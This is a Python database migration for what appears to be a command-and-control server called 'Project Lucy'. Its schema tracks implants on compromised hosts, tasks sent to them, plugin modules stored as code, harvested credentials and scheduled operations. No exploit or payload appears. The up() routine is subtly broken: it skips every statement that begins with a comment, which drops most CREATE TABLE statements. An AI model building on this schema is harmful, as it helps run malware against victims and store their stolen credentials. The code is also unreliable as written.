"""
Migration 001 — Initial schema for Project Lucy.

This migration is applied automatically on startup via database.initialize_database()
using Peewee's create_tables(safe=True). This file serves as a human-readable
record of the initial schema and can be used to recreate the DB from scratch.

Run manually:
    python -m db.migrations.001_initial
"""
import logging
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

logger = logging.getLogger(__name__)

SCHEMA_SQL = """
-- ============================================================
-- Project Lucy — Initial Schema
-- SQLite 3 / WAL mode
-- ============================================================

PRAGMA journal_mode = WAL;
PRAGMA foreign_keys = ON;

-- Users (operator accounts) --------------------------------
CREATE TABLE IF NOT EXISTS users (
    id           TEXT PRIMARY KEY,
    username     TEXT NOT NULL UNIQUE,
    password_hash TEXT NOT NULL,
    role         TEXT NOT NULL DEFAULT 'viewer',
    tenant_id    TEXT,
    api_key      TEXT UNIQUE,
    totp_secret  TEXT,
    totp_enabled INTEGER NOT NULL DEFAULT 0,
    last_login   DATETIME,
    created_at   DATETIME NOT NULL
);

-- Agent Groups ---------------------------------------------
CREATE TABLE IF NOT EXISTS agent_groups (
    id             TEXT PRIMARY KEY,
    name           TEXT NOT NULL UNIQUE,
    description    TEXT,
    type           TEXT NOT NULL DEFAULT 'static',
    dynamic_query  TEXT,
    tags           TEXT,
    created_at     DATETIME NOT NULL
);

-- Agents (implants) ----------------------------------------
CREATE TABLE IF NOT EXISTS agents (
    id            TEXT PRIMARY KEY,
    hostname      TEXT NOT NULL,
    os            TEXT NOT NULL,
    username      TEXT NOT NULL,
    ip_public     TEXT,
    ip_private    TEXT,
    architecture  TEXT,
    processor     TEXT,
    ram_total     INTEGER,
    ram_available INTEGER,
    first_seen    DATETIME NOT NULL,
    last_seen     DATETIME NOT NULL,
    status        TEXT NOT NULL DEFAULT 'offline',
    public_key    TEXT,
    aes_key       TEXT,
    group_id      TEXT REFERENCES agent_groups(id) ON DELETE SET NULL,
    tags          TEXT
);
CREATE INDEX IF NOT EXISTS idx_agents_status   ON agents(status);
CREATE INDEX IF NOT EXISTS idx_agents_last_seen ON agents(last_seen);
CREATE INDEX IF NOT EXISTS idx_agents_group_id  ON agents(group_id);

-- Tasks ----------------------------------------------------
CREATE TABLE IF NOT EXISTS tasks (
    id          TEXT PRIMARY KEY,
    agent_id    TEXT NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    module      TEXT NOT NULL,
    action      TEXT NOT NULL,
    params      TEXT,
    status      TEXT NOT NULL DEFAULT 'queued',
    priority    TEXT NOT NULL DEFAULT 'normal',
    result      TEXT,
    error       TEXT,
    created_at  DATETIME NOT NULL,
    executed_at DATETIME
);
CREATE INDEX IF NOT EXISTS idx_tasks_agent_id ON tasks(agent_id);
CREATE INDEX IF NOT EXISTS idx_tasks_status   ON tasks(status);

-- Modules (plugins) ----------------------------------------
CREATE TABLE IF NOT EXISTS modules (
    id            TEXT PRIMARY KEY,
    name          TEXT NOT NULL UNIQUE,
    version       TEXT NOT NULL,
    description   TEXT,
    author        TEXT,
    code          TEXT NOT NULL,
    dependencies  TEXT,
    os_compat     TEXT,
    signature     TEXT NOT NULL,
    enabled       INTEGER NOT NULL DEFAULT 1,
    install_count INTEGER NOT NULL DEFAULT 0,
    created_at    DATETIME NOT NULL,
    updated_at    DATETIME NOT NULL
);

-- Credentials (harvested) ----------------------------------
CREATE TABLE IF NOT EXISTS credentials (
    id                 TEXT PRIMARY KEY,
    agent_id           TEXT NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    url                TEXT,
    hostname           TEXT,
    username           TEXT NOT NULL,
    password_encrypted TEXT NOT NULL,
    source             TEXT NOT NULL,
    confidence         TEXT NOT NULL DEFAULT 'medium',
    tags               TEXT,
    captured_at        DATETIME NOT NULL,
    version            INTEGER NOT NULL DEFAULT 1,
    dedup_hash         TEXT
);
CREATE INDEX IF NOT EXISTS idx_credentials_agent_id   ON credentials(agent_id);
CREATE INDEX IF NOT EXISTS idx_credentials_dedup_hash ON credentials(dedup_hash);
CREATE INDEX IF NOT EXISTS idx_credentials_source     ON credentials(source);

-- File Events ----------------------------------------------
CREATE TABLE IF NOT EXISTS file_events (
    id         TEXT PRIMARY KEY,
    agent_id   TEXT NOT NULL REFERENCES agents(id) ON DELETE CASCADE,
    path       TEXT NOT NULL,
    action     TEXT NOT NULL,
    size       INTEGER,
    hash       TEXT,
    timestamp  DATETIME NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_file_events_agent_id ON file_events(agent_id);

-- Logs -----------------------------------------------------
CREATE TABLE IF NOT EXISTS logs (
    id         TEXT PRIMARY KEY,
    agent_id   TEXT REFERENCES agents(id) ON DELETE SET NULL,
    level      TEXT NOT NULL,
    module     TEXT NOT NULL,
    message    TEXT NOT NULL,
    log_type   TEXT NOT NULL DEFAULT 'system',
    timestamp  DATETIME NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_logs_agent_id  ON logs(agent_id);
CREATE INDEX IF NOT EXISTS idx_logs_level     ON logs(level);
CREATE INDEX IF NOT EXISTS idx_logs_timestamp ON logs(timestamp);

-- Refresh Tokens -------------------------------------------
CREATE TABLE IF NOT EXISTS refresh_tokens (
    id          TEXT PRIMARY KEY,
    user_id     TEXT NOT NULL REFERENCES users(id) ON DELETE CASCADE,
    token_hash  TEXT NOT NULL UNIQUE,
    expires_at  DATETIME NOT NULL,
    revoked     INTEGER NOT NULL DEFAULT 0,
    created_at  DATETIME NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_refresh_tokens_user_id ON refresh_tokens(user_id);

-- Timelines ------------------------------------------------
CREATE TABLE IF NOT EXISTS timelines (
    id          TEXT PRIMARY KEY,
    name        TEXT NOT NULL,
    description TEXT,
    agent_group TEXT,
    steps       TEXT,
    trigger     TEXT NOT NULL DEFAULT 'manual',
    cron_expr   TEXT,
    loop        INTEGER NOT NULL DEFAULT 0,
    status      TEXT NOT NULL DEFAULT 'draft',
    created_by  TEXT REFERENCES users(id) ON DELETE SET NULL,
    created_at  DATETIME NOT NULL,
    updated_at  DATETIME NOT NULL
);
CREATE INDEX IF NOT EXISTS idx_timelines_status ON timelines(status);
"""

SCHEMA_VERSION = "001"
DESCRIPTION = "Initial schema — all core tables"


def up() -> None:
    """Apply migration (idempotent — uses CREATE TABLE IF NOT EXISTS)."""
    from database import database

    logger.info("Running migration %s: %s", SCHEMA_VERSION, DESCRIPTION)
    with database:
        for statement in SCHEMA_SQL.strip().split(";"):
            stmt = statement.strip()
            if stmt and not stmt.startswith("--"):
                database.execute_sql(stmt)
    logger.info("Migration %s applied.", SCHEMA_VERSION)


def down() -> None:
    """Drop all tables (destructive — use with caution)."""
    from database import database

    tables = [
        "timelines", "refresh_tokens", "logs", "file_events",
        "credentials", "modules", "tasks", "agents", "agent_groups", "users",
    ]
    with database:
        for table in tables:
            database.execute_sql(f"DROP TABLE IF EXISTS {table}")
    logger.info("Migration %s rolled back — all tables dropped.", SCHEMA_VERSION)


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    action = sys.argv[1] if len(sys.argv) > 1 else "up"
    if action == "up":
        up()
    elif action == "down":
        down()
    else:
        print(f"Unknown action: {action}. Use 'up' or 'down'.")
        sys.exit(1)
